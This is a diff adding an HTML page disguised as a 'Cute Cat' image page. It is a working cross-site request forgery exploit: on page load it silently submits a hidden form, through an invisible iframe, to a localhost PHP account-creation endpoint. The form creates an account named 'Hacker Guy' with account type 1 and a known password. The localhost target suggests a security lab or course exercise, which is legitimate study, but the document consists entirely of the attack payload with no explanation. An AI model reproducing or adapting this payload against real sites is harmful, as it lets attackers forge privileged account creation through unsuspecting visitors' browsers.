@@ -1,0 +1,23 @@
+<html>
+<head>
+    <title>Cute Cat</title>
+</head>
+
+<body onload="document.payload.submit()">
+<img src="cute_cat.jpg" alt="Meow meow" style="height: 100%; width: 100%; object-fit: contain"/>
+<form action="http://localhost:8000/src/CreateAccountUpdateLogic.php"
+      method="POST" target="hiddenIFrame" name="payload">
+    <input type="hidden" name="acctype" value="1" />
+    <input type="hidden" name="password" value="csrf" />
+    <input type="hidden" name="fname" value="Hacker" />
+    <input type="hidden" name="lname" value="Guy" />
+    <input type="hidden" name="dob" value="01/01/1901" />
+    <input type="hidden" name="email" value="fake@email.com" />
+    <input type="hidden" name="studentyear" value="NULL" />
+    <input type="hidden" name="facultyrank" value="" />
+    <input type="hidden" name="squestion" value="Why am I here?" />
+    <input type="hidden" name="sanswer" value="CSRF" />
+</form>
+<iframe name="hiddenIFrame" style="display:none;"></iframe>
+</body>
+</html>
